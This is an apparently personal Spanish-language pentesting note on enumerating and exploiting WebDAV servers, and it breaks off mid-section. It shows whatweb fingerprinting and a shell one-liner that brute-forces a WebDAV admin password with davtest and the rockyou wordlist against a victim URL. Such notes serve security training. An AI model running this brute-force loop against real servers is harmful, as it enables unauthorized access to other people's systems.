#WebDAV #OWASP #Enumeracion #Explotacion 

#### Definición
>**WebDAV** (**Web Distributed Authoring and Versioning**) es una extensión del protocolo HTTP que permite a los usuarios **acceder** y **manipular** **archivos** en un servidor web a través de una conexión segura.

## Enumeración
Usaremos [[WHATWEB]] para identificar que tipo de tecnologías usa la pagina web es y así poder ver si es un WebDAV:
`whatweb <URL_Victima>`

Podemos usar una herramienta llamada [[DAVTEST]] nos enumera todos los tipos de archivos que se pueden subir a la web y cuales son ejecutables/interpretables, pero para ellos debemos de saber las credenciales
Si sabemos el nombre del usuario:
```shell
cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url <URL_Victima> -auth admin:$password 2>&1 | grep -i succeed); if [ $response ]; then echo "[+] La contraseña es $password"; break; fi; done
```

SI sabemos la contraseña: 
